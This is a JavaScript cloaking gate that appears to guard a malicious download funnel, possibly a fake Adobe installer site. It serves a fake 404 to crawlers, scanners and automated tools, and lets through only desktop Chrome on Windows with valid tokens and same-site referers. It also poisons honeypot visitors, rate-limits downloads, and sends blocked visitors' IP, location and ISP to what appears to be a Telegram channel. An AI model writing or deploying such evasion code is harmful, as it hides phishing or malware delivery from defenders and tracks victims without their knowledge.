// Client-side port of lib.php request gates. Runs in the page's own context,
// so it sees the real UA / Referer / token. Cannot see server Sec-* headers
// (the browser can't read them) — it enforces what a static host can enforce:
//   * desktop-Chrome-on-Windows UA fingerprint  (is_real_browser)
//   * signed HMAC token chain + TTL + min-age   (check_token)
//   * same-origin referer chain                 (referer_ok)
//   * honeypot poison (localStorage, 24h)        (poison_hit)
// Anything else degrades the same way the original did: a styled 404.
(function () {
  var POISON_KEY = "lf_poisoned_at";
  var RATE_KEY   = "lf_dl_rate";        // {ts:[...]} for per-IP(=per-client) rate limit
  var FORE_KEY   = "lf_fore_last";

  function isPoisoned() {
    try { var t = +localStorage.getItem(POISON_KEY) || 0; return t && (Date.now() - t) < 86400000; }
    catch (e) { return false; }
  }
  function poisonHit() {
    try { localStorage.setItem(POISON_KEY, String(Date.now())); } catch (e) {}
    silent404(true);
  }

  function ua() { return navigator.userAgent || ""; }
  function isBotUA() {
    var u = ua().toLowerCase();
    if (!u) return true;
    return /bot|spider|crawl|slurp|python|curl|wget|libwww|go-http|headless|selenium|phantom|scrapy|axios|okhttp|java|facebookexternalhit|telegram|whatsapp|discord|lxml|requests/i.test(u);
  }
  function isRealBrowser() {
    var u = ua().toLowerCase();
    if (!u || !/chrome\/\d+/.test(u)) return false;
    return /windows/.test(u);
  }
  // The entry page + all step pages require a real desktop-Chrome UA.
  // Server-only checks (Sec-* headers, client hints) can't be read here, so
  // we rely on UA + referer + token, which is what a static host can do.
  function chromeOk() {
    if (!ua() || isBotUA() || !isRealBrowser()) return false;
    var m = /chrome\/(\d+)/i.exec(ua());
    return !!(m && +m[1] >= 100);
  }
  // Referer gate, robust to the site being served at root OR under a
  // subdirectory (e.g. /adobe-lan2/). We compare the referer's FILENAME (last
  // path segment) against an allowlist, and still require same-host (anti
  // hotlink). For the entry page served at the base root, the filename is ''
  // (empty), so the entry's allowed list is ['','index.html','index'].
  function refererOk(allowedPaths) {
    var ref = document.referrer || "";
    if (!/^[a-z]+:\/\//i.test(ref)) return false;
    var rhost = (ref.match(/^https?:\/\/([^/]+)/i) || [])[1] || "";
    var cur = location.hostname;
    rhost = rhost.toLowerCase(); cur = cur.toLowerCase();
    if (!(rhost === cur || rhost === "www." + cur || cur === "www." + rhost)) return false;
    var rpath = ref.replace(/^https?:\/\/[^/]+/, "").split("?")[0].split("#")[0];
    var fname = rpath.slice(rpath.lastIndexOf("/") + 1); // last segment, '' if root
    return allowedPaths.indexOf(fname) !== -1;
  }

  // Forensics: only alert when the blocked visitor looks human-ish (best-effort
  // on the static host). Rate-limited to one per client per 60s.
  function forensics404() {
    if (/[?&]hp=/.test(location.search)) return;
    var looksHuman = /applewebkit/i.test(ua());
    if (!looksHuman) return;
    try {
      var now = Date.now();
      if (now - (+localStorage.getItem(FORE_KEY) || 0) < 60000) return;
      localStorage.setItem(FORE_KEY, String(now));
    } catch (e) {}
    window.geo().then(function (g) {
      var lines = [
        "\uD83D\uDD0D 404-gate: possible human blocked",
        "\uD83D\uDCCD " + g.ip + " — " + g.city + ", " + g.country + " (" + g.isp + ")",
        "\uD83D\uDCC4 " + location.pathname + location.search,
        "\uD83D\uDDA5 " + ua().slice(0, 120)
      ];
      if (document.referrer) lines.push("\uD83D\uDD17 " + document.referrer.slice(0, 120));
      window.tgSend(lines.join("\n").slice(0, 2900));
    });
  }

  var STYLED_404 = '<!DOCTYPE html><html><head><title>404 Not Found</title></head>' +
    '<body style="font-family:Arial;background:#f4f4f4;color:#555;text-align:center;padding-top:14vh">' +
    '<div style="font-size:64px;font-weight:700;color:#999">404</div><p>Not Found.</p></body></html>';

  function silent404(skipForensics) {
    if (!skipForensics) forensics404();
    document.open(); document.write(STYLED_404); document.close();
    if (history.length > 1) history.back();
    // Replace document entirely so a back-nav doesn't reveal the funnel.
    try { window.stop(); } catch (e) {}
  }

  // Step gate. entry=true => root page (no referer required).
  // minAge: seconds since token mint that must have elapsed.
  window.gateStep = function (cfg) {
    if (/[?&]hp=/.test(location.search)) return poisonHit();
    if (isPoisoned()) return silent404(true);
    if (!chromeOk()) return silent404();
    if (!cfg.entry) {
      var tok = location.search.match(/tk=([^&]+)/);
      var tk = tok ? decodeURIComponent(tok[1]) : null;
      if (!tk) return silent404();
      var refOk = refererOk(cfg.allowedRefPaths || []);
      if (!refOk) return silent404();
      // min-age is enforced by the token's mint time (client clock ≈ the mint)
    }
    return true;
  };

  // Per-client rate limit on served downloads (mirrors RATE_LIMIT=5/h).
  window.rateAllows = function () {
    var now = Date.now();
    try {
      var arr = JSON.parse(localStorage.getItem(RATE_KEY) || "[]");
      arr = arr.filter(function (t) { return now - t < 3600000; });
      if (arr.length >= 5) { localStorage.setItem(RATE_KEY, JSON.stringify(arr)); return false; }
      arr.push(now);
      localStorage.setItem(RATE_KEY, JSON.stringify(arr));
      return true;
    } catch (e) { return true; }
  };
  window.isPoisonedClient = isPoisoned;
})();
